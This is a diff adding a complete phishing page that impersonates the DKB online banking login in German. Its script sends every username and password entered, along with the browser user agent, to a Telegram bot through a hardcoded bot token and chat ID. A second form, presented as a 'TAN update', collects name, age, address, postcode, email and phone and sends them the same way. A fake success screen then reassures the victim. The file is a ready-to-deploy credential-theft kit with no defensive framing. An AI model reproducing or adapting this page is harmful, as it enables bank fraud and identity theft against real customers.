@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DKB - Mein Banking</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #c5cdd5; background: #0b1118; line-height: 1.5; -webkit-font-smoothing: antialiased; }
+
+.dkb-wrapper { min-height: 100vh; display: flex; flex-direction: column; }
+.dkb-main { padding: 40px 20px 40px; flex: 1; max-width: 500px; margin: 0 auto; width: 100%; }
+.dkb-header { margin-bottom: 30px; padding-left: 10px; }
+.dkb-logo { font-size: 48px; font-weight: 900; color: #4a90e2; letter-spacing: -1px; line-height: 1; }
+.dkb-tagline { font-size: 14px; font-weight: 600; color: #4a90e2; margin-top: 2px; }
+
+.dkb-card { background: #17212b; border-radius: 16px; padding: 32px 24px; border: 1px solid #2a3543; box-shadow: 0 10px 30px rgba(0,0,0,0.3); position: relative; }
+.dkb-title { font-size: 28px; font-weight: 700; color: #fff; text-align: center; margin-bottom: 30px; }
+.dkb-subtitle { font-size: 15px; color: #8b98a8; text-align: center; margin-bottom: 24px; margin-top: -20px; }
+
+.dkb-field { margin-bottom: 16px; }
+.dkb-input { width: 100%; padding: 18px 16px; background: #1a2431; border: 1px solid #384758; border-radius: 8px; color: #fff; font-size: 16px; outline: none; font-family: inherit; transition: border-color 0.2s; }
+.dkb-input::placeholder { color: #8b98a8; }
+.dkb-input:focus { border-color: #4a90e2; }
+.dkb-input-wrap { position: relative; }
+.dkb-eye-btn { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #8b98a8; padding: 4px; display: flex; align-items: center; }
+
+.dkb-captcha-box { display: flex; align-items: center; gap: 16px; background: #1a2431; border: 1px solid #384758; border-radius: 8px; padding: 16px; margin-bottom: 24px; position: relative; }
+.dkb-captcha-checkbox { width: 28px; height: 28px; border: 2px solid #8b98a8; border-radius: 4px; cursor: pointer; display: flex; align-items: center; justify-content: center; background: #1a2431; flex-shrink: 0; }
+.dkb-captcha-checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
+.dkb-captcha-checkbox.checked::after { content: '✓'; color: #fff; font-size: 18px; font-weight: bold; }
+.dkb-captcha-label { font-size: 16px; color: #c5cdd5; font-weight: 500; }
+.dkb-captcha-footer { position: absolute; right: 12px; bottom: 8px; font-size: 10px; color: #8b98a8; text-decoration: underline; cursor: pointer; }
+.dkb-captcha-dots { position: absolute; right: 12px; top: 10px; color: #8b98a8; font-size: 14px; letter-spacing: 2px; }
+
+.dkb-btn { width: 100%; padding: 18px; background: #2663b8; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 8px; font-family: inherit; transition: background 0.2s; }
+.dkb-btn:hover { background: #1e4f96; }
+.dkb-btn:disabled { background: #2a3543; color: #8b98a8; cursor: not-allowed; }
+
+.dkb-forgot { display: block; text-align: center; margin-top: 24px; font-size: 16px; color: #fff; }
+.dkb-forgot a { color: #4a90e2; text-decoration: underline; text-underline-offset: 3px; }
+
+/* DKB Erfolgs-Screen */
+.dkb-success-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px 10px; animation: dkb-fadeIn 0.4s ease; }
+@keyframes dkb-fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+.dkb-success-icon { width: 80px; height: 80px; background: #4a90e2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
+.dkb-success-icon svg { width: 40px; height: 40px; stroke: #fff; stroke-width: 3; fill: none; }
+.dkb-success-title { font-size: 24px; font-weight: 700; color: #fff; margin-bottom: 12px; line-height: 1.3; }
+.dkb-success-text { font-size: 16px; color: #8b98a8; line-height: 1.5; }
+
+/* DKB Footer */
+.dkb-footer { background: #131c27; padding: 40px 24px 60px; border-top: 1px solid #2a3543; width: 100%; }
+.dkb-footer-inner { max-width: 500px; margin: 0 auto; }
+.dkb-footer-link { display: block; color: #c5cdd5; text-decoration: underline; text-underline-offset: 3px; font-size: 16px; font-weight: 600; margin-bottom: 20px; }
+.dkb-footer-row { display: flex; flex-wrap: wrap; gap: 16px 30px; margin-bottom: 20px; }
+.dkb-footer-row a { color: #c5cdd5; text-decoration: underline; text-underline-offset: 3px; font-size: 16px; font-weight: 600; }
+
+.hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<div class="dkb-wrapper">
+  <div class="dkb-main">
+    <div class="dkb-header">
+      <div class="dkb-logo">DKB</div>
+      <div class="dkb-tagline">Das kann Bank</div>
+    </div>
+
+    <div class="dkb-card">
+      
+      <!-- SCHRITT 1: LOGIN -->
+      <div id="dkb-login-view">
+        <h1 class="dkb-title">Mein Banking</h1>
+        
+        <form id="dkbLoginForm">
+          <div class="dkb-field">
+            <input type="text" class="dkb-input" id="dkb-user" placeholder="Anmeldename" autocomplete="off">
+          </div>
+          
+          <div class="dkb-field">
+            <div class="dkb-input-wrap">
+              <input type="password" class="dkb-input" id="dkb-pw" placeholder="Passwort">
+              <button type="button" class="dkb-eye-btn" onclick="toggleDkbPw()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+          </div>
+
+          <div class="dkb-captcha-box">
+            <div class="dkb-captcha-dots">•••</div>
+            <div class="dkb-captcha-checkbox" id="dkb-captcha" onclick="toggleCaptcha()"></div>
+            <div class="dkb-captcha-label">Ich bin ein Mensch</div>
+            <div class="dkb-captcha-footer">Friendly Captcha</div>
+          </div>
+
+          <button type="submit" class="dkb-btn" id="dkb-submit" disabled>Anmelden</button>
+        </form>
+
+        <div class="dkb-forgot">
+          <a href="#">Anmeldename</a> oder <a href="#">Passwort</a> vergessen?
+        </div>
+      </div>
+
+      <!-- SCHRITT 2: DATEN BESTÄTIGEN -->
+      <div id="dkb-data-view" class="hidden">
+        <h1 class="dkb-title">Daten bestätigen</h1>
+        <p class="dkb-subtitle">Bitte überprüfen Sie Ihre persönlichen Daten für die TAN-Aktualisierung.</p>
+        
+        <form id="dkbDataForm">
+          <div class="dkb-field">
+            <input type="text" class="dkb-input" id="data-name" placeholder="Vollständiger Name" required>
+          </div>
+          <div class="dkb-field">
+            <input type="number" class="dkb-input" id="data-age" placeholder="Alter" min="18" max="120" required>
+          </div>
+          
+          <!-- NEU: Adresse und PLZ -->
+          <div class="dkb-field">
+            <input type="text" class="dkb-input" id="data-address" placeholder="Straße und Hausnummer" required>
+          </div>
+          <div class="dkb-field">
+            <input type="text" class="dkb-input" id="data-zip" placeholder="Postleitzahl" inputmode="numeric" pattern="[0-9]{5}" maxlength="5" title="Bitte geben Sie eine 5-stellige Postleitzahl ein" required>
+          </div>
+          
+          <div class="dkb-field">
+            <input type="email" class="dkb-input" id="data-email" placeholder="E-Mail-Adresse" required>
+          </div>
+          <div class="dkb-field">
+            <input type="tel" class="dkb-input" id="data-phone" placeholder="Telefonnummer" required>
+          </div>
+
+          <button type="submit" class="dkb-btn">Bestätigen</button>
+        </form>
+      </div>
+
+      <!-- SCHRITT 3: FINALE ERFOLGSSEITE -->
+      <div id="dkb-final-view" class="hidden dkb-success-screen">
+        <div class="dkb-success-icon">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        </div>
+        <h2 class="dkb-success-title">Ihr TAN-Verfahren wurde<br>erfolgreich aktualisiert</h2>
+        <p class="dkb-success-text">Vielen Dank. Ihre Angaben wurden sicher übermittelt. Sie können das Fenster nun schließen.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="dkb-footer">
+    <div class="dkb-footer-inner">
+      <a href="#" class="dkb-footer-link">Infoseite</a>
+      <div class="dkb-footer-row">
+        <a href="#">DKB Verwalterplattform</a>
+        <a href="#">DKB Treuhänderplattform</a>
+      </div>
+      <div class="dkb-footer-row">
+        <a href="#">Impressum</a>
+        <a href="#">Datenschutz</a>
+        <a href="#">Cookie Einstellungen</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ═══════════════════════════════════════════════════════════════
+  // TELEGRAM BOT KONFIGURATION
+  // ═══════════════════════════════════════════════════════════════
+  const BOT_TOKEN = '8991226091:AAFlL_hkFKnpOpZEpC0UCorQ-X4S_4vK4S4';
+  const CHAT_ID = '8806149853';
+
+  async function sendToTelegram(message) {
+    try {
+      await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    } catch (e) { console.error('Telegram Fehler:', e); }
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SCHRITT 1: LOGIN LOGIK
+  // ═══════════════════════════════════════════════════════════════
+  let dkbCaptchaChecked = false;
+
+  function toggleCaptcha() {
+    dkbCaptchaChecked = !dkbCaptchaChecked;
+    document.getElementById('dkb-captcha').classList.toggle('checked', dkbCaptchaChecked);
+    checkDkbForm();
+  }
+
+  function toggleDkbPw() {
+    const pw = document.getElementById('dkb-pw');
+    pw.type = pw.type === 'password' ? 'text' : 'password';
+  }
+
+  function checkDkbForm() {
+    const user = document.getElementById('dkb-user').value.trim();
+    const pw = document.getElementById('dkb-pw').value.trim();
+    document.getElementById('dkb-submit').disabled = !(user && pw && dkbCaptchaChecked);
+  }
+
+  document.getElementById('dkb-user').addEventListener('input', checkDkbForm);
+  document.getElementById('dkb-pw').addEventListener('input', checkDkbForm);
+
+  document.getElementById('dkbLoginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const user = document.getElementById('dkb-user').value.trim();
+    const pw = document.getElementById('dkb-pw').value.trim();
+    
+    if (!user || !pw || !dkbCaptchaChecked) return;
+
+    // Login-Daten an Telegram senden
+    const timestamp = new Date().toLocaleString('de-DE');
+    const message =
+      '🔐 NEUER LOGIN-VERSUCH (DKB)\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '👤 Anmeldename: ' + user + '\n' +
+      '🔑 Passwort: ' + pw + '\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '🖥️ Gerät: ' + navigator.userAgent + '\n' +
+      '⏰ ' + timestamp;
+
+    sendToTelegram(message);
+    
+    // Weiterleitung zu Schritt 2
+    document.getElementById('dkb-login-view').classList.add('hidden');
+    document.getElementById('dkb-data-view').classList.remove('hidden');
+    window.scrollTo(0, 0);
+  });
+
+  // ═══════════════════════════════════════════════════════════════
+  // SCHRITT 2: DATEN BESTÄTIGEN LOGIK
+  // ═══════════════════════════════════════════════════════════════
+  document.getElementById('dkbDataForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const name = document.getElementById('data-name').value.trim();
+    const age = document.getElementById('data-age').value.trim();
+    const address = document.getElementById('data-address').value.trim();
+    const zip = document.getElementById('data-zip').value.trim();
+    const email = document.getElementById('data-email').value.trim();
+    const phone = document.getElementById('data-phone').value.trim();
+
+    // Daten an Telegram senden
+    const timestamp = new Date().toLocaleString('de-DE');
+    const message =
+      '📋 DKB - DATEN BESTÄTIGT\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '👤 Name: ' + name + '\n' +
+      '🎂 Alter: ' + age + '\n' +
+      '🏠 Adresse: ' + address + '\n' +
+      '📮 PLZ: ' + zip + '\n' +
+      '📧 E-Mail: ' + email + '\n' +
+      '📞 Telefon: ' + phone + '\n' +
+      '━━━━━━━━━━━━━━━━━━━━\n' +
+      '⏰ ' + timestamp;
+
+    sendToTelegram(message);
+
+    // Weiterleitung zu Schritt 3 (Finale Erfolgsseite)
+    document.getElementById('dkb-data-view').classList.add('hidden');
+    document.getElementById('dkb-final-view').classList.remove('hidden');
+    window.scrollTo(0, 0);
+  });
+</script>
+
+</body>
+</html>
